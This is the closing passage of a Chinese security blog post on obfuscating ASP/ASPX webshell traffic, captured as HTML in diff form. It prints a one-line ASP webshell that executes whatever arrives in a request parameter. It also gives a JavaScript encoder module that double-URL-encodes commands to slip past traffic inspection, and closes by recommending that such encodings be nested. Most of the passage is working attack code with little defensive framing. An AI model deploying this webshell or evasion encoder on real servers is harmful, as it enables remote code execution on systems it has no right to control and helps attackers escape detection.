+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900388987-30c329f6-778e-42b8-9119-3d93d9942d96.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900388987-30c329f6-778e-42b8-9119-3d93d9942d96.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900388987-30c329f6-778e-42b8-9119-3d93d9942d96.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<h3 id="url_bypassasp" class="headerLink">
+    <a href="#url_bypassasp" class="header-mark"></a>4.2 url_bypass(asp)</h3><p>shell</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;%execute(unescape(request(&#34;mr6&#34;)))%&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>url_bypass编码器</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/**
+</span></span><span class="line"><span class="cl"> * asp::url_bypass 编码器
+</span></span><span class="line"><span class="cl"> * 双重url编码
+</span></span><span class="line"><span class="cl"> * author: yzddmr6
+</span></span><span class="line"><span class="cl"> * &lt;%execute(unescape(request(&#34;mr6&#34;)))%&gt;
+</span></span><span class="line"><span class="cl"> */
+</span></span><span class="line"><span class="cl">&#39;use strict&#39;;
+</span></span><span class="line"><span class="cl">module.exports = (pwd, data) =&gt; {
+</span></span><span class="line"><span class="cl">    function str2url(str) {
+</span></span><span class="line"><span class="cl">        var ret = &#34;&#34;;
+</span></span><span class="line"><span class="cl">        for (var i = 0; i &lt; str.length; i++) {
+</span></span><span class="line"><span class="cl">          ret += &#34;%&#34;+str[i].charCodeAt().toString(16);
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">        return ret;
+</span></span><span class="line"><span class="cl">      }
+</span></span><span class="line"><span class="cl">    data[pwd] = `asunescape(${str2url(str2url(data[&#39;_&#39;]))})`;
+</span></span><span class="line"><span class="cl">    delete data[&#39;_&#39;];
+</span></span><span class="line"><span class="cl">    return data;
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900389090-e41b260b-4d1e-497f-a5ef-7ce24ee8b265.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900389090-e41b260b-4d1e-497f-a5ef-7ce24ee8b265.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900389090-e41b260b-4d1e-497f-a5ef-7ce24ee8b265.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900389090-e41b260b-4d1e-497f-a5ef-7ce24ee8b265.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900389090-e41b260b-4d1e-497f-a5ef-7ce24ee8b265.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900389090-e41b260b-4d1e-497f-a5ef-7ce24ee8b265.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<h2 id="最后" class="headerLink">
+    <a href="#%e6%9c%80%e5%90%8e" class="header-mark"></a>5 最后</h2><p>个人推荐的做法还是类似随机cookie编码器那种一次一密的做法，不过可能asp/aspx实现起来不像php那么方便，有空了研究一下。</p>
+<p>上面所提到的编码方式可以相互套娃，效果可能更佳。</p>
+<p>如果其他想法后面再补上，此贴长期更新。</p>
+</div>
+
+        
+
+<div class="sponsor">
+        <div class="sponsor-avatar"><img
+        
+        loading="lazy"
+        src="/images/avatar.webp"
+        srcset="/images/avatar.webp, /images/avatar.webp 1.5x, /images/avatar.webp 2x"
+        sizes="auto"
+        alt="/images/avatar.webp"
+        title="/images/avatar.webp" height="640"   width="640" ></div><p class="sponsor-bio"><em>欢迎加入我的知识星球，共同交流网络安全技术~</em></p><div class="sponsor-custom"><a href="https://t.zsxq.com/FA6urjI" target="_blank"><img src="/zsxq.png" alt="网络安全回收站" style="width:50%;display:inline-block;" ></a></div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2020-05-01</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share"><button title="分享到 Twitter" data-sharer="twitter" data-url="https://yzddmr6.com/posts/asp-aspx-encoders/" data-title="ASP/ASPX下的流量混淆"><span class="fab fa-twitter fa-fw"></span></button><button title="分享到 Facebook" data-sharer="facebook" data-url="https://yzddmr6.com/posts/asp-aspx-encoders/"><span class="fab fa-facebook-square fa-fw"></span></button><button title="分享到 Hacker News" data-sharer="hackernews" data-url="https://yzddmr6.com/posts/asp-aspx-encoders/" data-title="ASP/ASPX下的流量混淆"><span class="fab fa-hacker-news fa-fw"></span></button><button title="分享到 Line" data-sharer="line" data-url="https://yzddmr6.com/posts/asp-aspx-encoders/" data-title="ASP/ASPX下的流量混淆"><span data-svg-src="/lib/simple-icons/icons/line.min.svg"></span></button><button title="分享到 微博" data-sharer="weibo" data-url="https://yzddmr6.com/posts/asp-aspx-encoders/" data-title="ASP/ASPX下的流量混淆"><span class="fab fa-weibo fa-fw"></span></button><button title="分享到 Telegram" data-sharer="telegram" data-url="https://yzddmr6.com/posts/asp-aspx-encoders/" data-title="ASP/ASPX下的流量混淆" data-web><span class="fab fa-telegram-plane fa-fw"></span></button><script>
+        function shareOnMastodon(title, link) {
+            const SHARE_MASTODON_DOMAIN = "share_mastodon_domain"
+            const savedDomain = localStorage.getItem(SHARE_MASTODON_DOMAIN) ?? "mastodon.social";
+            const domain = prompt("Enter your Mastodon domain", savedDomain);
+            if (domain === null) {
+                return;
+            }
+            localStorage.setItem(SHARE_MASTODON_DOMAIN, domain)
+            const text = title + "\n\n" + link;
+            const url = new URL("https://" + domain)
+            url.pathname = "share"
+            url.searchParams.append('text', text)
+            window.open(url, '_blank', "width=500,height=500,left=500,toolbar=0,status=0");
+        }
+    </script>
+    <button title="分享到 Mastodon"onclick="javascript:shareOnMastodon(&#34;ASP/ASPX下的流量混淆&#34;, &#34;https://yzddmr6.com/posts/asp-aspx-encoders/&#34;)"><span class="fab fa-mastodon fa-fw"></span></button></div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/php-preg-tricks/" class="prev" rel="prev" title="从一道CTF的非预期解看PHP反斜杠匹配问题"><i class="fas fa-angle-left fa-fw"></i>从一道CTF的非预期解看PHP反斜杠匹配问题</a>
+            <a href="/posts/tomcat-memory-webshell-filter/" class="next" rel="next" title="Tomcat内存Webshell解析之Filter型">Tomcat内存Webshell解析之Filter型<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"><div id="utterances"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">Utterances</a>.
+            </noscript></div></article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/yzddmr6" target="_blank" rel="noopener noreferrer">yzddMr6</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="回到顶部">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div class="assets"><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"","lightTheme":"github-light","repo":"Hugo-DoIt/utterances-comments"}},"search":{"algoliaAppID":"5YGRNRQK1G","algoliaIndex":"zh_cn_index","algoliaSearchKey":"0ff6874805de24b84aa1d5ebccad56cd","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"},"sharerjs":true,"table":{"sort":true}};</script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script><script type="text/javascript" src="/js/utterances.min.js" defer></script></div>
+</body>
+
+</html>
